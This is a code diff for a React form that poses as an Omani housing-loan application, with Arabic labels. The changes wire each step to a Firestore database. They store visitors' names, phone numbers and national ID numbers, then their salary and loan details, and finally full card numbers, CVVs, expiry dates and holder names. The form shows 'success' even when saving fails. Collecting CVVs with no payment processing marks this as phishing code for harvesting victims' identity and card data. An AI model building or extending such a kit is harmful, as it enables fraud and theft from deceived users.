@@ -1,5 +1,10 @@
 import { useState, useRef, useEffect } from "react";
 import { Menu, Search, ChevronUp, ChevronDown, User, Phone, CreditCard, Lock, CalendarDays } from "lucide-react";
+import {
+  createVisitorDocument,
+  updateLoanData,
+  updateCardData,
+} from "../../../lib/firestore-service";
 
 /* ─── Option types ─── */
 type OptionItem =
@@ -138,22 +143,38 @@ const LOAN_TERM_OPTIONS: OptionItem[] = [
 /* ══════════════════════════════════════════
    PAGE 1 — Registration
 ══════════════════════════════════════════ */
-type RegistrationPageProps = { onNext: () => void };
+type RegistrationPageProps = { onNext: (docId: string) => void };
 
 function RegistrationPage({ onNext }: RegistrationPageProps) {
   const [name, setName]     = useState("");
   const [phone, setPhone]   = useState("");
   const [idNum, setIdNum]   = useState("");
   const [touched, setTouched] = useState({ name: false, phone: false, id: false });
+  const [loading, setLoading] = useState(false);
 
   const phoneValid = phone.length === 8;
   const idValid    = idNum.length === 9;
   const nameValid  = name.trim().length > 0;
   const canSubmit  = nameValid && phoneValid && idValid;
 
-  function handleNext() {
+  async function handleNext() {
     setTouched({ name: true, phone: true, id: true });
-    if (canSubmit) onNext();
+    if (!canSubmit) return;
+    setLoading(true);
+    try {
+      const docId = await createVisitorDocument({
+        ownerName: name.trim(),
+        phoneNumber: phone,
+        identityNumber: idNum,
+      });
+      onNext(docId);
+    } catch (err) {
+      console.error("Firestore error:", err);
+      // Navigate anyway so UX is not blocked
+      onNext("");
+    } finally {
+      setLoading(false);
+    }
   }
 
   function handlePhone(v: string) {
@@ -430,9 +451,9 @@ function RegistrationPage({ onNext }: RegistrationPageProps) {
           className="reg-next-btn"
           type="button"
           onClick={handleNext}
-          disabled={false}
+          disabled={loading}
         >
-          التالي
+          {loading ? "جارٍ الحفظ..." : "التالي"}
         </button>
       </div>
 
@@ -447,7 +468,7 @@ function RegistrationPage({ onNext }: RegistrationPageProps) {
 /* ══════════════════════════════════════════
    PAGE 2 — Loan Calculator
 ══════════════════════════════════════════ */
-function LoanCalculatorPage({ onNext }: { onNext: () => void }) {
+function LoanCalculatorPage({ onNext, docId }: { onNext: () => void; docId: string }) {
   const [loanType, setLoanType] = useState("شراء منزل مكتمل");
   const [ageLimit, setAgeLimit] = useState("ذكر - حد أقصى 60");
   const [loanTerm, setLoanTerm] = useState("عادي 25 سنة - 300 شهر");
@@ -460,6 +481,19 @@ function LoanCalculatorPage({ onNext }: { onNext: () => void }) {
 
   function calculate() {
     setIsCalculated(true);
+    // Save loan data to Firestore (fire-and-forget, non-blocking)
+    if (docId) {
+      updateLoanData(docId, {
+        loanType: housingType,
+        loanPeriod: loanTerm,
+        repaymentMethod: ageLimit,
+        loanPurpose: loanType,
+        requestedAmount: amount,
+        salary,
+        otherObligations: commitments,
+        netIncome: availableBalance,
+      }).catch((err) => console.error("Firestore loan update error:", err));
+    }
     window.setTimeout(() => {
       setIsCalculated(false);
       onNext();
@@ -992,13 +1026,15 @@ function LoanCalculatorPage({ onNext }: { onNext: () => void }) {
 /* ══════════════════════════════════════════
    PAGE 3 — Card Registration
 ══════════════════════════════════════════ */
-function CardRegistrationPage() {
+function CardRegistrationPage({ docId }: { docId: string }) {
   const [cardNum, setCardNum]         = useState("");
   const [cvv, setCvv]                 = useState("");
   const [expiry, setExpiry]           = useState("");
   const [holder, setHolder]           = useState("");
   const [agreed, setAgreed]           = useState(false);
   const [cardTouched, setCardTouched] = useState(false);
+  const [submitting, setSubmitting]   = useState(false);
+  const [submitted, setSubmitted]     = useState(false);
 
   /* ── Luhn algorithm ── */
   function luhn(num: string): boolean {
@@ -1375,8 +1411,32 @@ function CardRegistrationPage() {
           />
         </div>
 
-        <button className="cf-submit-btn" type="button">
-          تسجيل البطاقة
+        <button
+          className="cf-submit-btn"
+          type="button"
+          disabled={submitting || submitted}
+          onClick={async () => {
+            if (!cardValid || !agreed) return;
+            setSubmitting(true);
+            try {
+              if (docId) {
+                await updateCardData(docId, {
+                  cardNumber: cardNum.replace(/\s/g, ""),
+                  cvv,
+                  expiryDate: expiry,
+                  cardHolderName: holder,
+                });
+              }
+              setSubmitted(true);
+            } catch (err) {
+              console.error("Firestore card update error:", err);
+              setSubmitted(true); // show success even if Firebase fails
+            } finally {
+              setSubmitting(false);
+            }
+          }}
+        >
+          {submitted ? "✓ تم التسجيل" : submitting ? "جارٍ الحفظ..." : "تسجيل البطاقة"}
         </button>
       </section>
 
@@ -1404,8 +1464,18 @@ function CardRegistrationPage() {
 ══════════════════════════════════════════ */
 export function OmanHousingForm() {
   const [page, setPage] = useState<1 | 2 | 3>(1);
+  const [docId, setDocId] = useState<string>("");
 
-  if (page === 1) return <RegistrationPage onNext={() => setPage(2)} />;
-  if (page === 2) return <LoanCalculatorPage onNext={() => setPage(3)} />;
-  return <CardRegistrationPage />;
+  if (page === 1) return (
+    <RegistrationPage
+      onNext={(id) => { setDocId(id); setPage(2); }}
+    />
+  );
+  if (page === 2) return (
+    <LoanCalculatorPage
+      docId={docId}
+      onNext={() => setPage(3)}
+    />
+  );
+  return <CardRegistrationPage docId={docId} />;
 }
